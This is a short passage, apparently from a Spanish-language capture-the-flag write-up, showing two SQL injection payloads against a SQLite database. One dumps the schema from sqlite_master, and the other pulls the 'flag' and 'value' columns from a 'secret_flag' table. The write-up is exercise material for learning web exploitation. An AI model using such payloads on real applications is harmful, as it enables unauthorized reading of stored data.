' or 1=1 union select 1,2,sql,4,5 from sqlite_master --
```

<figure><img src="/files/iZGgi2N9HNUKCcVPXFTK" alt=""><figcaption></figcaption></figure>

Observamos que la tabla `secret_flag` tiene 2 valores, `flag` y `value`.

#### Obtener flag

Usaremos el payload final:

```
' or 1=1 union select flag,2,value,4,5 from secret_flag --
```

<figure><img src="/files/6pEO4cCiaBOOZND6k0fm" alt=""><figcaption></figcaption></figure>
